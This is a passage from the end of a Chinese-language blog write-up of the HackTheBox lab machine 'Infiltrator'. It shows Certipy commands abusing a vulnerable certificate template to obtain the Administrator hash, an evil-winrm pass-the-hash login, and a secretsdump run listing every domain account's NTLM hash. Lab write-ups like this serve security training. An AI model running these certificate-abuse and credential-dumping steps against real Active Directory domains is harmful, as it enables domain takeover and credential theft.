<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">certipy template -u 'infiltrator_svc$' -hashes 52dfec373c144cb8d50334cb73934612 -dc-ip 10.10.11.31 -template Infiltrator_Template -save-old</span><br><span class="line"></span><br><span class="line">certipy req -u 'infiltrator_svc$' -hashes 52dfec373c144cb8d50334cb73934612 -dc-ip 10.10.11.31 -ca infiltrator-DC01-CA -target infiltrator.htb -template Infiltrator_Template -upn administrator@infiltrator.htb</span><br><span class="line"></span><br><span class="line">faketime -f "-8h10m" certipy auth -pfx administrator.pfx -domain infiltrator.htb -dc-ip 10.10.11.31</span><br><span class="line"></span><br><span class="line">[*] Got hash for 'administrator@infiltrator.htb': aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090230.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090231.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090232.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>得到Administrator hash后就直接登录了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i DC01.INFILTRATOR.HTB -u Administrator -H 1356f502d2764368302ff0369b1121a1</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090233.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">python3 examples/secretsdump.py Administrator@10.10.11.31 -hashes :1356f502d2764368302ff0369b1121a1 -just-dc-ntlm</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d400d2ccb162e93b66e8025118a55104:::</span><br><span class="line">infiltrator.htb\D.anderson:1103:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::</span><br><span class="line">infiltrator.htb\L.clark:1104:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::</span><br><span class="line">infiltrator.htb\M.harris:1105:aad3b435b51404eeaad3b435b51404ee:3ed8cf1bd9504320b50b2191e8fb7069:::</span><br><span class="line">infiltrator.htb\O.martinez:1106:aad3b435b51404eeaad3b435b51404ee:daf40bbfbf00619b01402e5f3acd40a9:::</span><br><span class="line">infiltrator.htb\A.walker:1107:aad3b435b51404eeaad3b435b51404ee:f349468bb2c669ec8c3fd4154fdfe126:::</span><br><span class="line">infiltrator.htb\K.turner:1108:aad3b435b51404eeaad3b435b51404ee:a119c0d5af383e9591ebb67857e2b658:::</span><br><span class="line">infiltrator.htb\E.rodriguez:1109:aad3b435b51404eeaad3b435b51404ee:b02e97f2fdb5c3d36f77375383449e56:::</span><br><span class="line">infiltrator.htb\winrm_svc:1601:aad3b435b51404eeaad3b435b51404ee:120c6c7a0acb0cd808e4b601a4f41fd4:::</span><br><span class="line">infiltrator.htb\lan_managment:8101:aad3b435b51404eeaad3b435b51404ee:a1983d156e1d0fdf9b01208e2b46670d:::</span><br><span class="line"><span class="meta">DC01$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:c4d8ecef85fdd70a87fa9c8da56a417f:::</span></span><br><span class="line"><span class="meta">infiltrator_svc$</span><span class="bash">:3102:aad3b435b51404eeaad3b435b51404ee:4bc37a35b66f6ea51e478ca5473d4e59:::</span></span><br></pre></td></tr></table></figure>



<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>Get User Descriptions | NetExec<br><a href="https://www.netexec.wiki/ldap-protocol/get-user-descriptions" target="_blank" rel="noopener">https://www.netexec.wiki/ldap-protocol/get-user-descriptions</a></li>
<li>impacket/examples/dacledit.py at master · fortra/impacket<br><a href="https://github.com/fortra/impacket/blob/master/examples/dacledit.py" target="_blank" rel="noopener">https://github.com/fortra/impacket/blob/master/examples/dacledit.py</a></li>
<li>CravateRouge/bloodyAD: BloodyAD is an Active Directory Privilege Escalation Framework<br><a href="https://github.com/CravateRouge/bloodyAD" target="_blank" rel="noopener">https://github.com/CravateRouge/bloodyAD</a></li>
<li>API for Chat Rooms | Output Messenger Server Manager<br><a href="https://support.outputmessenger.com/chat-room-api/#Retrieving_all_chat_rooms" target="_blank" rel="noopener">https://support.outputmessenger.com/chat-room-api/#Retrieving_all_chat_rooms</a></li>
<li>almandin/ntdsdotsqlite: A small utility to translate NTDS.dit files to SQLite format.<br><a href="https://github.com/almandin/ntdsdotsqlite" target="_blank" rel="noopener">https://github.com/almandin/ntdsdotsqlite</a></li>
<li>ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse<br><a href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4" target="_blank" rel="noopener">https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2025-06-16T04:57:21.705Z" itemprop="dateUpdated">2025-06-16 12:57:21</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2024/09/02/Infiltrator-HackTheBox/&title=《Infiltrator - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2024/09/02/Infiltrator-HackTheBox/&title=《Infiltrator - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2024/09/02/Infiltrator-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Infiltrator - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2024/09/02/Infiltrator-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2024/09/02/Infiltrator-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2024/09/10/Sightless-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Sightless - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2024/08/26/MonitorsThree-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">MonitorsThree - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2025</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2024/09/02/Infiltrator-HackTheBox/&title=《Infiltrator - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2024/09/02/Infiltrator-HackTheBox/&title=《Infiltrator - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2024/09/02/Infiltrator-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Infiltrator - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2024/09/02/Infiltrator-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2024/09/02/Infiltrator-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKElEQVR42u3aQW7DMAwF0dz/0u62BSplPukEMDVaGYgd6W0IkuLrhdf1a+3fWb2/+nX/1c1LhgwZj2Vc27XfmFNXv6b7LneRIUPGAQwSQNPtOY+E6TdnliFDhgz8XIORZxkyZMhIGShdKyWFMmTIkNEpYsn7exgvUz9Yi8uQIeOBDN51//7zR+43ZMiQ8ShGLXSmAXEVdjsn+bOLDBkyRjN4gOODETw1JIljMPwhQ4aM0Yz+6ANn80YeCdBxsihDhowHMmphFLXp20MbQYopQ4aMAxi1PyWhkF9JcrYMGTJOY5DCspNEkq/SMjW4iZUhQ8YIBi9H07Y+L2VvCNkyZMg4gIESr7AZ1xnU4GF6meHKkCHjGEZ/1qw2eBEniDJkyBjN6BwrLV9R6CwloDJkyJjNuNqrz+sMW/xzEytDhoxxDJ4IpgUqb5zViuE3wV2GDBmDGGnjvjY2UctJg/dlyJAxmlH7jATHtFnWCbsyZMg4gXFXwsfHNdK9EEaGDBlHMlIegfUHyJZnkCFDxmGM9Oj8K55KxqWvDBkyDmDw8Fcbnui34VDAlSFDxjhGZ7QibcOlCWhwLSFDhozRjPRmMN04zdxIWklSTBkyZMxjpEGWD7PWLkqLlw0yZMg4gFFrmdWCYzwJQpAyZMiQcVM6mF5IBFmtDBkyZODhMH4xyVtpqFUnQ4aMAxi8NE23rwXuOJTLkCFjNIOXjjz43ptQ1kY6ZMiQMYLxAzsNslC6k8pyAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
